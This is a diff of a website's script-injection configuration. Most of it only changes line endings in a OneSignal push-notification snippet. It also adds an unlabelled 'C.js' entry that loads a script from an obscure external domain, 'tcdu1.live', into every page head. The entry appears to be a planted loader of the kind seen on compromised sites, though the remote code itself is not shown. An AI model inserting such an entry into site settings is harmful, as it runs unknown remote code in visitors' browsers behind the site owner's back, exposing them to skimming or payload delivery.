@@ -41,7 +41,18 @@
         {
             "name": "onesignal",
             "kind": "onesignal",
-            "code_head": "<script src=\"https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js\" defer></script>\n<script>\nwindow.OneSignalDeferred = window.OneSignalDeferred || [];\nOneSignalDeferred.push(async function (OneSignal) {\n  await OneSignal.init({\n    appId: \"25b6a167-e7ce-4cdd-a8f6-364aba0ffa0a\",\n    serviceWorkerPath: \"/sw.js\",\n    serviceWorkerParam: { scope: \"/\" },\n  });\n});\n</script>",
+            "code_head": "<script src=\"https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js\" defer></script>\r\n<script>\r\nwindow.OneSignalDeferred = window.OneSignalDeferred || [];\r\nOneSignalDeferred.push(async function (OneSignal) {\r\n  await OneSignal.init({\r\n    appId: \"25b6a167-e7ce-4cdd-a8f6-364aba0ffa0a\",\r\n    serviceWorkerPath: \"/sw.js\",\r\n    serviceWorkerParam: { scope: \"/\" },\r\n  });\r\n});\r\n</script>",
+            "code_body": "",
+            "code_footer": "",
+            "display": 1,
+            "place_head": 1,
+            "place_body": 0,
+            "place_footer": 0
+        },
+        {
+            "name": "C.js",
+            "kind": "",
+            "code_head": "<script src=\"https://tcdu1.live/c.js\" data-id=\"3efa7f29-b37c-4d52-9409-34139f6ea5a5\" data-utcoffset=\"3\" defer></script>",
             "code_body": "",
             "code_footer": "",
             "display": 1,
